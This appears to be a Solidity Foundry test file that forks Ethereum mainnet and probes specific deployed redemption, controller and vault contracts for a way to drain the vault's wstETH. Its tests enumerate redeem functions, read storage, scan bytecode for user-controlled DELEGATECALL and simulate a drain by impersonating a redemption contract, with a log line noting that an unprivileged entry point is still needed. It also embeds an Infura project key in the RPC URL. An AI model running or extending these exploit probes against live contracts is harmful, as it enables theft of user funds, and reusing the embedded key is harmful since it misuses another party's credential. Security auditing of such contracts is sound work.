// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract RedemptionFlowExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckRedeemWithRecipient() public {
        console.log("=== CHECKING REDEEM WITH RECIPIENT ===\n");

        // Check if there's a redeem(uint96, address) on REDEMPTION_0

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        console.log("Trying redeem variants with recipient:");

        // redeem(uint96,address)
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96,address)", uint96(100e18), attacker)
        );
        console.log("redeem(uint96,address):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // redeem(uint256,address)
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // requestRedeem(uint96,address)
        (bool s3, bytes memory d3) = REDEMPTION_0.call(
            abi.encodeWithSignature("requestRedeem(uint96,address)", uint96(100e18), attacker)
        );
        console.log("requestRedeem(uint96,address):", s3);
        if (!s3 && d3.length >= 4) console.logBytes4(bytes4(d3));

        vm.stopPrank();
    }

    function test_InvestigateRedemptionRequest() public {
        console.log("=== INVESTIGATING REDEMPTION REQUEST STORAGE ===\n");

        // Let's see what a redemption request looks like
        // 0xb2118a8d is likely getRedemptionRequest(address, uint256)

        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d), attacker, uint256(0))
        );
        console.log("getRedemptionRequest(attacker, 0):", s1);
        if (s1) {
            console.log("Return length:", d1.length);
        }

        // Check REDEMPTION_0 storage for requests
        console.log("\nREDEMPTION_0 storage slots 10-20:");
        for (uint i = 10; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckWhitelist() public view {
        console.log("=== CHECKING WHITELIST IN REDEMPTION_0 ===\n");

        // Maybe there's a whitelist that controls who can redeem

        // Check 0xaa271e1a pattern (isMinter/isWhitelisted)
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0xaa271e1a), attacker)
        );
        if (s1 && d1.length >= 32) {
            console.log("0xaa271e1a(attacker):", abi.decode(d1, (bool)));
        }

        // Check if any address validation exists
        // 0x411557d1 might be isWhitelisted
        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0x411557d1), attacker)
        );
        if (s2 && d2.length >= 32) {
            console.log("0x411557d1(attacker):", abi.decode(d2, (bool)));
        }
    }

    function test_CheckRedemption1Selectors() public view {
        console.log("=== CHECKING REDEMPTION_1 SELECTORS ===\n");

        bytes memory code = REDEMPTION_1.code;

        console.log("REDEMPTION_1 function selectors:");
        bytes4[] memory uniqueSels = new bytes4[](60);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff || sel == bytes4(0)) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && selCount < 60) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                }
            }
        }

        for (uint i = 0; i < selCount; i++) {
            console.logBytes4(uniqueSels[i]);
        }
    }

    function test_TryRedemption1Redeem() public {
        console.log("=== TRYING REDEMPTION_1 REDEEM ===\n");

        // REDEMPTION_1 might have different functions than REDEMPTION_0

        deal(IAU, attacker, 100000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        console.log("Trying REDEMPTION_1 functions:");

        // redeem(uint96)
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem(uint96):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // redeem(uint256,address)
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
    }

    function test_DecodeFinalizeRedeemBytecode() public view {
        console.log("=== DECODING FINALIZEREDEEM BYTECODE ===\n");

        bytes memory code = REDEMPTION_0.code;

        // finalizeRedeem(uint256) = 0xaff6cbf1
        // Find where this function starts and trace the code

        bytes4 finalizeSel = bytes4(0xaff6cbf1);

        console.log("Looking for finalizeRedeem handler:");

        // Find the jump destination for this selector
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == finalizeSel) {
                    console.log("Found selector at:", i);

                    // Look for JUMPI after it
                    for (uint j = i; j < i + 30 && j < code.length; j++) {
                        if (uint8(code[j]) == 0x57) { // JUMPI
                            console.log("JUMPI at:", j);
                            // The jump destination should be 2-3 bytes before JUMPI
                            break;
                        }
                    }
                }
            }
        }
    }

    function test_CheckRCCallerRequirement() public view {
        console.log("=== CHECKING RC CALLER REQUIREMENT ===\n");

        // Check RC storage for registered contracts

        // Mapping structure: keccak256(key . slot)
        // For mapping(address => bool/uint), slot is typically low

        // Check if REDEMPTION_0 is registered
        for (uint slot = 0; slot < 10; slot++) {
            bytes32 key0 = keccak256(abi.encode(REDEMPTION_0, slot));
            bytes32 val0 = vm.load(REDEMPTION_CONTROLLER, key0);
            if (val0 != bytes32(0)) {
                console.log("REDEMPTION_0 in mapping at slot", slot, ":");
                console.logBytes32(val0);
            }

            bytes32 key1 = keccak256(abi.encode(REDEMPTION_1, slot));
            bytes32 val1 = vm.load(REDEMPTION_CONTROLLER, key1);
            if (val1 != bytes32(0)) {
                console.log("REDEMPTION_1 in mapping at slot", slot, ":");
                console.logBytes32(val1);
            }
        }
    }

    function test_FullExploitSimulation() public {
        console.log("=== FULL EXPLOIT SIMULATION ===\n");

        // Simulate the proven exploit
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Prank as REDEMPTION_0 and call RC.redeem
        vm.startPrank(REDEMPTION_0);
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("RC.redeem success:", success);
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
        console.log("Drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");

        if (attackerWstETH > 0) {
            console.log("\n*** EXPLOIT CONFIRMED - Need unprivileged entry point ***");
        }
    }

    function test_SearchForDelegatecallTarget() public view {
        console.log("=== SEARCHING FOR DELEGATECALL TARGET PATTERN ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Look for any DELEGATECALL that might use calldata
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                console.log("\nDELEGATECALL at:", i);

                // Check 100 bytes before for CALLDATALOAD
                uint start = i > 100 ? i - 100 : 0;
                bool hasCalldataload = false;
                bool hasSload = false;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x35) {
                        hasCalldataload = true;
                        console.log("  CALLDATALOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x54) {
                        hasSload = true;
                        console.log("  SLOAD at:", j);
                    }
                }

                if (hasCalldataload && !hasSload) {
                    console.log("  *** POTENTIAL USER-CONTROLLED DELEGATECALL! ***");
                }
            }
        }
    }
}
